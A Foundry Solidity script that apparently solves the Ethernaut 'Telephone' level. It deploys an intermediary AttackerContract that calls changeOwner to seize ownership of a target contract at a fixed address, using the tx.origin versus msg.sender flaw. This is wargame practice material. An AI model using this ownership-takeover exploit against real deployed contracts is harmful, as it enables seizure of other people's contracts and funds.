// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Telephone.sol";

contract Level4Script is Script {
    Telephone telephone = Telephone(0x3f80f4966E2abc674cd8F1A817bB4D5B46663d35);
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function run() public {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        AttackerContract attackContract = new AttackerContract();
        attackContract.attack();

        vm.stopBroadcast();
    }
}

contract AttackerContract {
    Telephone telephone = Telephone(0x3f80f4966E2abc674cd8F1A817bB4D5B46663d35);
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function attack() public {
        telephone.changeOwner(attacker);
    }
}
